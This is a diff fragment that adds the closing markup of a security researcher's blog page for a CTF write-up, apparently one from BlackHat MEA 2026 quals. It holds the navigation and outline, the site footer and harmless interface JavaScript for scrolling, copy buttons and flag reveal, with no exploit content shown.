+          <nav class="pager" aria-label="Challenge navigation"><a href="/blog/blackhat-mea-2026-quals/deckforge/"><span class="dir">← Previous</span><span class="t">DeckForge</span></a><span class="empty"></span></nav>
+        </article>
+        <aside class="wu-rail">
+          <h2>On this page</h2>
+          <ol><li><a href="#recon">Recon</a></li><li><a href="#the-bug">The bug</a></li><li><a href="#exploitation">Exploitation</a></li><li><a href="#dead-ends">Dead ends</a></li></ol>
+        </aside>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site-foot">
+  <div class="container">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <a class="wordmark" href="/">Usama Arshad<span class="dot">.</span></a>
+        <p>Offensive Security Lead. Red team, AppSec, and cloud security for fintech at scale. Based in Riyadh, Saudi Arabia.</p>
+      </div>
+      <nav class="foot-col" aria-label="Site index">
+        <h2>Index</h2>
+        <ul>
+          <li><a href="/">Portfolio</a></li>
+          <li><a href="/blog/">Writing</a></li>
+          <li><a href="/research/">Research</a></li>
+          <li><a href="/dorks/">Dork library</a></li>
+          <li><a href="/#contact">Contact</a></li>
+        </ul>
+      </nav>
+      <div class="foot-col">
+        <h2>Elsewhere</h2>
+        <ul>
+          <li><a href="https://github.com/usama0x01" target="_blank" rel="noopener">GitHub</a></li>
+          <li><a href="https://wpscan.com/leaderboard/" target="_blank" rel="noopener">WPScan leaderboard</a></li>
+          <li><a href="https://medium.com/@usama0x01" target="_blank" rel="noopener">Medium</a></li>
+          <li><a href="mailto:gusama21@gmail.com">gusama21@gmail.com</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="foot-base">
+      <span>© 2026 Usama Arshad · Riyadh, Saudi Arabia</span>
+      <span class="colophon">Set in Fraunces, Inter &amp; JetBrains Mono, self-hosted · No trackers, no cookies</span>
+      <a href="#top">Back to top ↑</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function () {
+  "use strict";
+  var reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+  var head = document.querySelector(".site-head");
+  function onScroll(){ head.classList.toggle("scrolled", window.scrollY > 8); }
+  window.addEventListener("scroll", onScroll, { passive:true }); onScroll();
+
+  var prog = document.getElementById("prog");
+  if (prog) {
+    var tick = function () {
+      var h = document.documentElement;
+      var max = h.scrollHeight - h.clientHeight;
+      prog.style.width = (max > 0 ? (h.scrollTop / max) * 100 : 0) + "%";
+    };
+    window.addEventListener("scroll", tick, { passive:true });
+    window.addEventListener("resize", tick); tick();
+  }
+
+  var revealEls = Array.prototype.slice.call(document.querySelectorAll("[data-reveal]"));
+  if (reduceMotion || !("IntersectionObserver" in window)) {
+    revealEls.forEach(function (el) { el.classList.add("in"); });
+  } else {
+    var io = new IntersectionObserver(function (es) {
+      es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add("in"); io.unobserve(e.target); } });
+    }, { threshold:0.08, rootMargin:"0px 0px -5% 0px" });
+    revealEls.forEach(function (el) { io.observe(el); });
+    var geo = function () {
+      revealEls.forEach(function (el) {
+        if (!el.classList.contains("in") && el.getBoundingClientRect().top < window.innerHeight*0.95) el.classList.add("in");
+      });
+    };
+    window.addEventListener("scroll", geo, { passive:true });
+    window.addEventListener("resize", geo); geo();
+  }
+
+  document.querySelectorAll(".code-copy").forEach(function (btn) {
+    btn.addEventListener("click", function () {
+      var pre = btn.closest(".code").querySelector("code");
+      var text = pre ? pre.textContent : "";
+      var done = function () {
+        btn.textContent = "Copied"; btn.classList.add("done");
+        setTimeout(function(){ btn.textContent = "Copy"; btn.classList.remove("done"); }, 1400);
+      };
+      if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done, function(){});
+      else {
+        var ta=document.createElement("textarea"); ta.value=text; ta.style.position="absolute"; ta.style.left="-9999px";
+        document.body.appendChild(ta); ta.select();
+        try { document.execCommand("copy"); done(); } catch(e){}
+        document.body.removeChild(ta);
+      }
+    });
+  });
+
+  document.querySelectorAll(".flagbox .reveal-btn").forEach(function (btn) {
+    btn.addEventListener("click", function () {
+      var box = btn.closest(".flagbox");
+      btn.textContent = box.classList.toggle("shown") ? "Hide" : "Reveal";
+    });
+  });
+
+  var rail = document.querySelector(".wu-rail");
+  if (rail && "IntersectionObserver" in window) {
+    var links = Array.prototype.slice.call(rail.querySelectorAll("a"));
+    var secs = links.map(function (a) { return document.querySelector(a.getAttribute("href")); }).filter(Boolean);
+    var spy = new IntersectionObserver(function (entries) {
+      entries.forEach(function (e) {
+        if (!e.isIntersecting) return;
+        links.forEach(function (a) { a.classList.toggle("on", a.getAttribute("href") === "#" + e.target.id); });
+      });
+    }, { rootMargin:"-20% 0px -70% 0px" });
+    secs.forEach(function (s) { spy.observe(s); });
+  }
+})();
+</script>
+</body>
+</html>
